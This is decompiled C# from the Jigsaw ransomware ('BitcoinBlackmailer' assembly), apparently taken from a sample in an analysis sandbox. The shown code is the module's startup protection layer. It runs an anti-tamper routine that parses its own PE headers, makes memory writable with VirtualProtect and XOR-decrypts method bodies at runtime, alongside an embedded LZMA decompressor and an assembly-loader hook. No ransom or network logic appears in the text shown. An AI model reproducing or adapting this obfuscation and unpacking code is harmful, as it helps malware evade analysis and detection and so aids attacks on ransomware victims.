// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using Costura;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

internal class \u003CModule\u003E
{
  static \u003CModule\u003E()
  {
    \u003CModule\u003E.smethod_1();
    // ISSUE: reference to a compiler-generated method
    AssemblyLoader.Attach();
  }

  internal static byte[] smethod_0(byte[] byte_0)
  {
    MemoryStream stream_0 = new MemoryStream(byte_0);
    \u003CModule\u003E.Class1 class1 = new \u003CModule\u003E.Class1();
    byte[] numArray = new byte[5];
    stream_0.Read(numArray, 0, 5);
    class1.method_5(numArray);
    long long_1 = 0;
    for (int index = 0; index < 8; ++index)
    {
      int num = stream_0.ReadByte();
      long_1 |= (long) (byte) num << 8 * index;
    }
    byte[] buffer = new byte[(int) long_1];
    MemoryStream stream_1 = new MemoryStream(buffer, true);
    long long_0 = stream_0.Length - 13L;
    class1.method_4((Stream) stream_0, (Stream) stream_1, long_0, long_1);
    return buffer;
  }

  [DllImport("kernel32.dll")]
  internal static extern bool VirtualProtect(
    IntPtr intptr_0,
    uint uint_0,
    uint uint_1,
    ref uint uint_2);

  internal static unsafe void smethod_1()
  {
    Module module = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module.FullyQualifiedName;
    bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
    byte* numPtr1 = hinstance + (int) *(uint*) (hinstance + 60);
    ushort num1 = *(ushort*) (numPtr1 + 6);
    ushort num2 = *(ushort*) (numPtr1 + 20);
    uint* intptr_0 = (uint*) null;
    uint num3 = 0;
    uint* numPtr2 = (uint*) (numPtr1 + 24 + (int) num2);
    uint num4 = 2645598073;
    uint num5 = 1933369620;
    uint num6 = 2025323140;
    uint num7 = 1763099987;
    for (int index1 = 0; index1 < (int) num1; ++index1)
    {
      uint* numPtr3 = numPtr2;
      uint* numPtr4 = (uint*) ((IntPtr) numPtr3 + new IntPtr(4));
      int num8 = (int) *numPtr3;
      uint* numPtr5 = numPtr4;
      uint* numPtr6 = (uint*) ((IntPtr) numPtr5 + new IntPtr(4));
      int num9 = (int) *numPtr5;
      switch ((uint) (num8 * num9))
      {
        case 0:
          numPtr2 = numPtr6 + 8;
          continue;
        case 1180703597:
          intptr_0 = (uint*) (hinstance + (flag ? (int) numPtr6[3] : (int) numPtr6[1]));
          num3 = (uint) ((flag ? (int) numPtr6[2] : (int) *numPtr6) >>> 2);
          goto case 0;
        default:
          uint* numPtr7 = (uint*) (hinstance + (flag ? (int) numPtr6[3] : (int) numPtr6[1]));
          uint num10 = numPtr6[2] >> 2;
          for (uint index2 = 0; index2 < num10; ++index2)
          {
            uint num11 = (uint) (((int) num4 ^ (int) *numPtr7++) + (int) num5 + (int) num6 * (int) num7);
            num4 = num5;
            num5 = num7;
            num7 = num11;
          }
          goto case 0;
      }
    }
    uint[] numArray1 = new uint[16];
    uint[] numArray2 = new uint[16];
    for (int index = 0; index < 16; ++index)
    {
      numArray1[index] = num7;
      numArray2[index] = num5;
      uint num12 = num5 >> 5 | num5 << 27;
      num5 = num6 >> 3 | num6 << 29;
      num6 = num7 >> 7 | num7 << 25;
      num7 = num12 >> 11 | num12 << 21;
    }
    numArray1[0] = numArray1[0] ^ numArray2[0];
    numArray1[1] = numArray1[1] * numArray2[1];
    numArray1[2] = numArray1[2] + numArray2[2];
    numArray1[3] = numArray1[3] ^ numArray2[3];
    numArray1[4] = numArray1[4] * numArray2[4];
    numArray1[5] = numArray1[5] + numArray2[5];
    numArray1[6] = numArray1[6] ^ numArray2[6];
    numArray1[7] = numArray1[7] * numArray2[7];
    numArray1[8] = numArray1[8] + numArray2[8];
    numArray1[9] = numArray1[9] ^ numArray2[9];
    numArray1[10] = numArray1[10] * numArray2[10];
    numArray1[11] = numArray1[11] + numArray2[11];
    numArray1[12] = numArray1[12] ^ numArray2[12];
    numArray1[13] = numArray1[13] * numArray2[13];
    numArray1[14] = numArray1[14] + numArray2[14];
    numArray1[15] = numArray1[15] ^ numArray2[15];
    uint uint_2 = 64;
    \u003CModule\u003E.VirtualProtect((IntPtr) (void*) intptr_0, num3 << 2, 64U, ref uint_2);
    uint num13 = 0;
    for (uint index = 0; index < num3; ++index)
    {
      uint* numPtr8 = intptr_0;
      int num14 = (int) *numPtr8 ^ (int) numArray1[(IntPtr) (num13 & 15U)];
      *numPtr8 = (uint) num14;
      numArray1[(IntPtr) (num13 & 15U)] = (uint) (((int) numArray1[(IntPtr) (num13 & 15U)] ^ (int) *intptr_0++) + 1035675673);
      ++num13;
    }
  }

  internal struct Struct0
  {
    internal uint uint_0;

    internal void method_0() => this.uint_0 = 1024U;

    internal uint method_1(\u003CModule\u003E.Class0 class0_0)
    {
      uint num = (class0_0.uint_1 >> 11) * this.uint_0;
      if (class0_0.uint_0 < num)
      {
        class0_0.uint_1 = num;
        this.uint_0 += 2048U - this.uint_0 >> 5;
        if (class0_0.uint_1 < 16777216U)
        {
          class0_0.uint_0 = class0_0.uint_0 << 8 | (uint) (byte) class0_0.stream_0.ReadByte();
          class0_0.uint_1 <<= 8;
        }
        return 0;
      }
      class0_0.uint_1 -= num;
      class0_0.uint_0 -= num;
      this.uint_0 -= this.uint_0 >> 5;
      if (class0_0.uint_1 < 16777216U)
      {
        class0_0.uint_0 = class0_0.uint_0 << 8 | (uint) (byte) class0_0.stream_0.ReadByte();
        class0_0.uint_1 <<= 8;
      }
      return 1;
    }
  }

  internal struct Struct1
  {
    internal readonly \u003CModule\u003E.Struct0[] struct0_0;
    internal readonly int int_0;

    internal Struct1(int int_1)
    {
      this.int_0 = int_1;
      this.struct0_0 = new \u003CModule\u003E.Struct0[1 << int_1];
    }

    internal void method_0()
    {
      for (uint index = 1; (long) index < (long) (1 << this.int_0); ++index)
        this.struct0_0[(IntPtr) index].method_0();
    }

    internal uint method_1(\u003CModule\u003E.Class0 class0_0)
    {
      uint index = 1;
      for (int int0 = this.int_0; int0 > 0; --int0)
        index = (index << 1) + this.struct0_0[(IntPtr) index].method_1(class0_0);
      return index - (uint) (1 << this.int_0);
    }

    internal uint method_2(\u003CModule\u003E.Class0 class0_0)
    {
      uint index1 = 1;
      uint num1 = 0;
      for (int index2 = 0; index2 < this.int_0; ++index2)
      {
        uint num2 = this.struct0_0[(IntPtr) index1].method_1(class0_0);
        index1 = (index1 << 1) + num2;
        num1 |= num2 << index2;
      }
      return num1;
    }

    internal static uint smethod_0(
      \u003CModule\u003E.Struct0[] struct0_1,
      uint uint_0,
      \u003CModule\u003E.Class0 class0_0,
      int int_1)
    {
      uint num1 = 1;
      uint num2 = 0;
      for (int index = 0; index < int_1; ++index)
      {
        uint num3 = struct0_1[(IntPtr) (uint_0 + num1)].method_1(class0_0);
        num1 = (num1 << 1) + num3;
        num2 |= num3 << index;
      }
      return num2;
    }
  }

  internal class Class0
  {
    internal uint uint_0;
    internal uint uint_1;
    internal Stream stream_0;

    internal void method_0(Stream stream_1)
    {
      this.stream_0 = stream_1;
      this.uint_0 = 0U;
      this.uint_1 = uint.MaxValue;
      for (int index = 0; index < 5; ++index)
        this.uint_0 = this.uint_0 << 8 | (uint) (byte) this.stream_0.ReadByte();
    }

    internal void method_1() => this.stream_0 = (Stream) null;

    internal void method_2()
    {
      for (; this.uint_1 < 16777216U; this.uint_1 <<= 8)
        this.uint_0 = this.uint_0 << 8 | (uint) (byte) this.stream_0.ReadByte();
    }

    internal uint method_3(int int_0)
    {
      uint uint1 = this.uint_1;
      uint num1 = this.uint_0;
      uint num2 = 0;
      for (int index = int_0; index > 0; --index)
      {
        uint1 >>= 1;
        uint num3 = num1 - uint1 >> 31;
        num1 -= uint1 & num3 - 1U;
        num2 = (uint) ((int) num2 << 1 | 1 - (int) num3);
        if (uint1 < 16777216U)
        {
          num1 = num1 << 8 | (uint) (byte) this.stream_0.ReadByte();
          uint1 <<= 8;
        }
      }
      this.uint_1 = uint1;
      this.uint_0 = num1;
      return num2;
    }

    internal Class0()
    {
    }
  }

  internal class Class1
  {
    internal readonly \u003CModule\u003E.Struct0[] struct0_0 = new \u003CModule\u003E.Struct0[new IntPtr(192)];
    internal readonly \u003CModule\u003E.Struct0[] struct0_1 = new \u003CModule\u003E.Struct0[new IntPtr(192)];
    internal readonly \u003CModule\u003E.Struct0[] struct0_2 = new \u003CModule\u003E.Struct0[new IntPtr(12)];
    internal readonly \u003CModule\u003E.Struct0[] struct0_3 = new \u003CModule\u003E.Struct0[new IntPtr(12)];
    internal readonly \u003CModule\u003E.Struct0[] struct0_4 = new \u003CModule\u003E.Struct0[new IntPtr(12)];
    internal readonly \u003CModule\u003E.Struct0[] struct0_5 = new \u003CModule\u003E.Struct0[new IntPtr(12)];
    internal readonly \u003CModule\u003E.Class1.Class2 class2_0 = new \u003CModule\u003E.Class1.Class2();
    internal readonly \u003CModule\u003E.Class1.Class3 class3_0 = new \u003CModule\u003E.Class1.Class3();
    internal readonly \u003CModule\u003E.Class4 class4_0 = new \u003CModule\u003E.Class4();
    internal readonly \u003CModule\u003E.Struct0[] struct0_6 = new \u003CModule\u003E.Struct0[new IntPtr(114)];
    internal readonly \u003CModule\u003E.Struct1[] struct1_0 = new \u003CModule\u003E.Struct1[new IntPtr(4)];
    internal readonly \u003CModule\u003E.Class0 class0_0 = new \u003CModule\u003E.Class0();
    internal readonly \u003CModule\u003E.Class1.Class2 class2_1 = new \u003CModule\u003E.Class1.Class2();
    internal bool bool_0;
    internal uint uint_0;
    internal uint uint_1;
    internal \u003CModule\u003E.Struct1 struct1_1 = new \u003CModule\u003E.Struct1(4);
    internal uint uint_2;

    internal Class1()
    {
      this.uint_0 = uint.MaxValue;
      for (int index = 0; index < 4; ++index)
        this.struct1_0[index] = new \u003CModule\u003E.Struct1(6);
    }

    internal void method_0(uint uint_3)
    {
      if ((int) this.uint_0 == (int) uint_3)
        return;
      this.uint_0 = uint_3;
      this.uint_1 = Math.Max(this.uint_0, 1U);
      this.class4_0.method_0(Math.Max(this.uint_1, 4096U));
    }

    internal void method_1(int int_0, int int_1) => this.class3_0.method_0(int_0, int_1);

    internal void method_2(int int_0)
    {
      uint uint_1 = (uint) (1 << int_0);
      this.class2_0.method_0(uint_1);
      this.class2_1.method_0(uint_1);
      this.uint_2 = uint_1 - 1U;
    }

    internal void method_3(Stream stream_0, Stream stream_1)
    {
      this.class0_0.method_0(stream_0);
      this.class4_0.method_1(stream_1, this.bool_0);
      for (uint index1 = 0; index1 < 12U; ++index1)
      {
        for (uint index2 = 0; index2 <= this.uint_2; ++index2)
        {
          uint index3 = (index1 << 4) + index2;
          this.struct0_0[(IntPtr) index3].method_0();
          this.struct0_1[(IntPtr) index3].method_0();
        }
        this.struct0_2[(IntPtr) index1].method_0();
        this.struct0_3[(IntPtr) index1].method_0();
        this.struct0_4[(IntPtr) index1].method_0();
        this.struct0_5[(IntPtr) index1].method_0();
      }
      this.class3_0.method_1();
      for (uint index = 0; index < 4U; ++index)
        this.struct1_0[(IntPtr) index].method_0();
      for (uint index = 0; index < 114U; ++index)
        this.struct0_6[(IntPtr) index].method_0();
      this.class2_0.method_1();
      this.class2_1.method_1();
      this.struct1_1.method_0();
    }

    internal void method_4(Stream stream_0, Stream stream_1, long long_0, long long_1)
    {
      this.method_3(stream_0, stream_1);
      \u003CModule\u003E.Struct3 struct3 = new \u003CModule\u003E.Struct3();
      struct3.method_0();
      uint uint_3 = 0;
      uint num1 = 0;
      uint num2 = 0;
      uint num3 = 0;
      ulong uint_1_1 = 0;
      ulong num4 = (ulong) long_1;
      if (0UL < num4)
      {
        int num5 = (int) this.struct0_0[(IntPtr) (struct3.uint_0 << 4)].method_1(this.class0_0);
        struct3.method_1();
        this.class4_0.method_5(this.class3_0.method_3(this.class0_0, 0U, (byte) 0));
        ++uint_1_1;
      }
      while (uint_1_1 < num4)
      {
        uint uint_1_2 = (uint) uint_1_1 & this.uint_2;
        if (this.struct0_0[(IntPtr) ((struct3.uint_0 << 4) + uint_1_2)].method_1(this.class0_0) == 0U)
        {
          byte byte_0 = this.class4_0.method_6(0U);
          this.class4_0.method_5(struct3.method_5() ? this.class3_0.method_3(this.class0_0, (uint) uint_1_1, byte_0) : this.class3_0.method_4(this.class0_0, (uint) uint_1_1, byte_0, this.class4_0.method_6(uint_3)));
          struct3.method_1();
          ++uint_1_1;
        }
        else
        {
          uint num6;
          if (this.struct0_2[(IntPtr) struct3.uint_0].method_1(this.class0_0) == 1U)
          {
            if (this.struct0_3[(IntPtr) struct3.uint_0].method_1(this.class0_0) == 0U)
            {
              if (this.struct0_1[(IntPtr) ((struct3.uint_0 << 4) + uint_1_2)].method_1(this.class0_0) == 0U)
              {
                struct3.method_4();
                this.class4_0.method_5(this.class4_0.method_6(uint_3));
                ++uint_1_1;
                continue;
              }
            }
            else
            {
              uint num7;
              if (this.struct0_4[(IntPtr) struct3.uint_0].method_1(this.class0_0) == 0U)
              {
                num7 = num1;
              }
              else
              {
                if (this.struct0_5[(IntPtr) struct3.uint_0].method_1(this.class0_0) == 0U)
                {
                  num7 = num2;
                }
                else
                {
                  num7 = num3;
                  num3 = num2;
                }
                num2 = num1;
              }
              num1 = uint_3;
              uint_3 = num7;
            }
            num6 = this.class2_1.method_2(this.class0_0, uint_1_2) + 2U;
            struct3.method_3();
          }
          else
          {
            num3 = num2;
            num2 = num1;
            num1 = uint_3;
            num6 = 2U + this.class2_0.method_2(this.class0_0, uint_1_2);
            struct3.method_2();
            uint num8 = this.struct1_0[(IntPtr) \u003CModule\u003E.Class1.smethod_0(num6)].method_1(this.class0_0);
            if (num8 >= 4U)
            {
              int int_1 = (int) (num8 >> 1) - 1;
              uint num9 = (uint) ((2 | (int) num8 & 1) << int_1);
              uint_3 = num8 >= 14U ? num9 + (this.class0_0.method_3(int_1 - 4) << 4) + this.struct1_1.method_2(this.class0_0) : num9 + \u003CModule\u003E.Struct1.smethod_0(this.struct0_6, (uint) ((int) num9 - (int) num8 - 1), this.class0_0, int_1);
            }
            else
              uint_3 = num8;
          }
          if ((ulong) uint_3 < uint_1_1 && uint_3 < this.uint_1 || uint_3 != uint.MaxValue)
          {
            this.class4_0.method_4(uint_3, num6);
            uint_1_1 += (ulong) num6;
          }
          else
            break;
        }
      }
      this.class4_0.method_3();
      this.class4_0.method_2();
      this.class0_0.method_1();
    }

    internal void method_5(byte[] byte_0)
    {
      int int_1 = (int) byte_0[0] % 9;
      int num = (int) byte_0[0] / 9;
      int int_0_1 = num % 5;
      int int_0_2 = num / 5;
      uint uint_3 = 0;
      for (int index = 0; index < 4; ++index)
        uint_3 += (uint) byte_0[1 + index] << index * 8;
      this.method_0(uint_3);
      this.method_1(int_0_1, int_1);
      this.method_2(int_0_2);
    }

    internal static uint smethod_0(uint uint_3)
    {
      uint_3 -= 2U;
      return uint_3 < 4U ? uint_3 : 3U;
    }

    internal class Class2
    {
      internal readonly \u003CModule\u003E.Struct1[] struct1_0 = new \u003CModule\u003E.Struct1[new IntPtr(16)];
      internal readonly \u003CModule\u003E.Struct1[] struct1_1 = new \u003CModule\u003E.Struct1[new IntPtr(16)];
      internal \u003CModule\u003E.Struct0 struct0_0 = new \u003CModule\u003E.Struct0();
      internal \u003CModule\u003E.Struct0 struct0_1 = new \u003CModule\u003E.Struct0();
      internal \u003CModule\u003E.Struct1 struct1_2 = new \u003CModule\u003E.Struct1(8);
      internal uint uint_0;

      internal void method_0(uint uint_1)
      {
        for (uint uint0 = this.uint_0; uint0 < uint_1; ++uint0)
        {
          this.struct1_0[(IntPtr) uint0] = new \u003CModule\u003E.Struct1(3);
          this.struct1_1[(IntPtr) uint0] = new \u003CModule\u003E.Struct1(3);
        }
        this.uint_0 = uint_1;
      }

      internal void method_1()
      {
        this.struct0_0.method_0();
        for (uint index = 0; index < this.uint_0; ++index)
        {
          this.struct1_0[(IntPtr) index].method_0();
          this.struct1_1[(IntPtr) index].method_0();
        }
        this.struct0_1.method_0();
        this.struct1_2.method_0();
      }

      internal uint method_2(\u003CModule\u003E.Class0 class0_0, uint uint_1)
      {
        if (this.struct0_0.method_1(class0_0) == 0U)
          return this.struct1_0[(IntPtr) uint_1].method_1(class0_0);
        uint num = 8;
        return this.struct0_1.method_1(class0_0) != 0U ? num + 8U + this.struct1_2.method_1(class0_0) : num + this.struct1_1[(IntPtr) uint_1].method_1(class0_0);
      }

      internal Class2()
      {
      }
    }

    internal class Class3
    {
      internal \u003CModule\u003E.Class1.Class3.Struct2[] struct2_0;
      internal int int_0;
      internal int int_1;
      internal uint uint_0;

      internal void method_0(int int_2, int int_3)
      {
        if (this.struct2_0 != null && this.int_1 == int_3 && this.int_0 == int_2)
          return;
        this.int_0 = int_2;
        this.uint_0 = (uint) ((1 << int_2) - 1);
        this.int_1 = int_3;
        uint length = (uint) (1 << this.int_1 + this.int_0);
        this.struct2_0 = new \u003CModule\u003E.Class1.Class3.Struct2[(IntPtr) length];
        for (uint index = 0; index < length; ++index)
          this.struct2_0[(IntPtr) index].method_0();
      }

      internal void method_1()
      {
        uint num = (uint) (1 << this.int_1 + this.int_0);
        for (uint index = 0; index < num; ++index)
          this.struct2_0[(IntPtr) index].method_1();
      }

      internal uint method_2(uint uint_1, byte byte_0) => (uint) ((((int) uint_1 & (int) this.uint_0) << this.int_1) + ((int) byte_0 >> 8 - this.int_1));

      internal byte method_3(\u003CModule\u003E.Class0 class0_0, uint uint_1, byte byte_0) => this.struct2_0[(IntPtr) this.method_2(uint_1, byte_0)].method_2(class0_0);

      internal byte method_4(
        \u003CModule\u003E.Class0 class0_0,
        uint uint_1,
        byte byte_0,
        byte byte_1)
      {
        return this.struct2_0[(IntPtr) this.method_2(uint_1, byte_0)].method_3(class0_0, byte_1);
      }

      internal Class3()
      {
      }

      internal struct Struct2
      {
        internal \u003CModule\u003E.Struct0[] struct0_0;

        internal void method_0() => this.struct0_0 = new \u003CModule\u003E.Struct0[768];

        internal void method_1()
        {
          for (int index = 0; index < 768; ++index)
            this.struct0_0[index].method_0();
        }

        internal byte method_2(\u003CModule\u003E.Class0 class0_0)
        {
          uint index = 1;
          do
          {
            index = index << 1 | this.struct0_0[(IntPtr) index].method_1(class0_0);
          }
          while (index < 256U);
          return (byte) index;
        }

        internal byte method_3(\u003CModule\u003E.Class0 class0_0, byte byte_0)
        {
          uint index = 1;
          do
          {
            uint num1 = (uint) ((int) byte_0 >> 7 & 1);
            byte_0 <<= 1;
            uint num2 = this.struct0_0[(IntPtr) ((uint) (1 + (int) num1 << 8) + index)].method_1(class0_0);
            index = index << 1 | num2;
            if ((int) num1 != (int) num2)
              goto label_4;
          }
          while (index < 256U);
          goto label_5;
label_4:
          while (index < 256U)
            index = index << 1 | this.struct0_0[(IntPtr) index].method_1(class0_0);
label_5:
          return (byte) index;
        }
      }
    }
  }

  internal class Class4
  {
    internal byte[] byte_0;
    internal uint uint_0;
    internal Stream stream_0;
    internal uint uint_1;
    internal uint uint_2;

    internal void method_0(uint uint_3)
    {
      if ((int) this.uint_2 != (int) uint_3)
        this.byte_0 = new byte[(IntPtr) uint_3];
      this.uint_2 = uint_3;
      this.uint_0 = 0U;
      this.uint_1 = 0U;
    }

    internal void method_1(Stream stream_1, bool bool_0)
    {
      this.method_2();
      this.stream_0 = stream_1;
      if (bool_0)
        return;
      this.uint_1 = 0U;
      this.uint_0 = 0U;
    }

    internal void method_2()
    {
      this.method_3();
      this.stream_0 = (Stream) null;
      Buffer.BlockCopy((Array) new byte[this.byte_0.Length], 0, (Array) this.byte_0, 0, this.byte_0.Length);
    }

    internal void method_3()
    {
      uint count = this.uint_0 - this.uint_1;
      if (count == 0U)
        return;
      this.stream_0.Write(this.byte_0, (int) this.uint_1, (int) count);
      if (this.uint_0 >= this.uint_2)
        this.uint_0 = 0U;
      this.uint_1 = this.uint_0;
    }

    internal void method_4(uint uint_3, uint uint_4)
    {
      uint num = (uint) ((int) this.uint_0 - (int) uint_3 - 1);
      if (num >= this.uint_2)
        num += this.uint_2;
      for (; uint_4 > 0U; --uint_4)
      {
        if (num >= this.uint_2)
          num = 0U;
        this.byte_0[(IntPtr) this.uint_0++] = this.byte_0[(IntPtr) num++];
        if (this.uint_0 >= this.uint_2)
          this.method_3();
      }
    }

    internal void method_5(byte byte_1)
    {
      this.byte_0[(IntPtr) this.uint_0++] = byte_1;
      if (this.uint_0 < this.uint_2)
        return;
      this.method_3();
    }

    internal byte method_6(uint uint_3)
    {
      uint index = (uint) ((int) this.uint_0 - (int) uint_3 - 1);
      if (index >= this.uint_2)
        index += this.uint_2;
      return this.byte_0[(IntPtr) index];
    }

    internal Class4()
    {
    }
  }

  internal struct Struct3
  {
    internal uint uint_0;

    internal void method_0() => this.uint_0 = 0U;

    internal void method_1()
    {
      if (this.uint_0 < 4U)
        this.uint_0 = 0U;
      else if (this.uint_0 < 10U)
        this.uint_0 -= 3U;
      else
        this.uint_0 -= 6U;
    }

    internal void method_2() => this.uint_0 = this.uint_0 < 7U ? 7U : 10U;

    internal void method_3() => this.uint_0 = this.uint_0 < 7U ? 8U : 11U;

    internal void method_4() => this.uint_0 = this.uint_0 < 7U ? 9U : 11U;

    internal bool method_5() => this.uint_0 < 7U;
  }
}
